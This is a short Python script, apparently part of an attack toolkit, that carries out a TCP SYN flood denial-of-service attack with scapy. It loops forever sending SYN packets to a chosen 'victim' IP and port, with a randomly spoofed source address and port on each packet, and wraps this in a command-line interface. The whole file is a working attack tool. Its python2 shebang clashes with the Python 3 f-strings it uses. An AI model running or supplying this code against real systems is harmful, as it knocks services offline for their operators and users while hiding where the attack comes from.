#!/usr/bin/env python2
# -*- coding: utf-8 -*-
import os
import sys
import time
from time import ctime

sys.path.append(os.path.abspath(__file__).split('backend')[0])
import random
from scapy.layers.inet import IP, TCP
from scapy.sendrecv import send


def __randomize_ip():
    return ".".join(map(str, (random.randint(0, 255) for _ in range(4))))


def __randomize_int(st, ed):
    return random.randint(st, ed)


def __randomize_port():
    return __randomize_int(49152, 65535)


def syn_flood(target, port):
    print(f'[+] Starting TCP SYN Flooding at {ctime(time.time())}')
    try:
        while True:
            ip_pkt = IP()
            ip_pkt.src = __randomize_ip()
            ip_pkt.dst = target

            tcp_pkt = TCP()
            tcp_pkt.sport = __randomize_port()
            tcp_pkt.dport = int(port)
            tcp_pkt.flags = "S"
            tcp_pkt.seq = __randomize_int(1000, 9000)
            tcp_pkt.window = __randomize_int(1000, 9000)

            send(ip_pkt / tcp_pkt, verbose=0)

            time.sleep(0.1)
    except KeyboardInterrupt:
        raise IOError('[!] TCP SYN Flooding aborted.')
    except Exception as exc:
        print('[!] Error: {!r}'.format(exc))


ARGS_INFO = {'Target IP': ('str', 'target', "IP address of victim target", True),
             'Target Port': ('str', 'port', "Port of victim target", True)}


def process_args(args):
    import argparse

    parser = argparse.ArgumentParser(
        description='A Simple Tool For TCP Syn Flood Attack',
        formatter_class=argparse.RawTextHelpFormatter)
    parser.add_argument('target', type=str, metavar='ADDRESSES',
                        help=ARGS_INFO['Target IP'][2])
    parser.add_argument('-p', '--port', type=str, required=True,
                        help=ARGS_INFO['Target Port'][2])
    return parser.parse_args(args)


def main(args=None):
    if not args:
        args = vars(process_args(args))
    syn_flood(**args)


if __name__ == '__main__':
    main()
